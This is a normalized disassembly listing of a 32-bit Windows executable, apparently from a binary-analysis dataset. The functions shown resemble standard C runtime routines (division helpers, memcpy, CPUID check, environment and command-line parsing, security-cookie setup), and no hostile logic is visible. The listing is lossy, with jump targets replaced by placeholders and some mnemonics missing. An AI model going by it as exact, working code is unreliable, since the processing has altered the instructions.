div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_42fdb0
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_42fe62
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_42fee9
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_42fee9
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_42fe62
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_43001c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_42ffcc
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_43008b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_42eecd
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_4300db
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_42a413
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_42894a
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_4258f0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_4258f0
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_424869
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_42894a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_424869
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_42aae1
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423c0e
add esp 0x14
sub_4301b9
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_437dbc
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_437dbc
pop ecx
test eax eax
je r-xdata
call sub_437dbc
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_430353
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_42a413
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_4301b9
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_428905
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_4301b9
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_43040e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_428905
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_428905
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_4285a0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_424869
pop ecx
mov [ ebp - 0x4 ] ebx
sub_430545
push 0x54
push r--data
call sub_42b398
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_42894a
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_42894a
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_42b3dd
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_435756
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_435756
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_430799
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_4307bf
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_4307e5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_430880
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_43661c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_43661c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_4308cc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_433812
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_43385b
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_424869
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_42b5a0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_428160
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_425484
pop ecx
cmp eax ebx
je r-xdata
call sub_433a10
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_430a86
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4308cc
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_430ae6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_430b2a
push 0x20
push r--data
call sub_42b398
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_42a6bc
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_42b3dd
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_430ae6
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_42b1b3
mov [ ebp - 0x1c ] 0x1
push eax
call sub_42a4ac
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_425eb1
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423d36
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_42e2b8
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_42a4a3
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_430c9e
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_430cda
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
movzx ecx [ eax + 0x42 ]
movzx edx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
test esi esi
jne r-xdata
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ecx
xor ebx ebx
inc ebx
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42c723
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
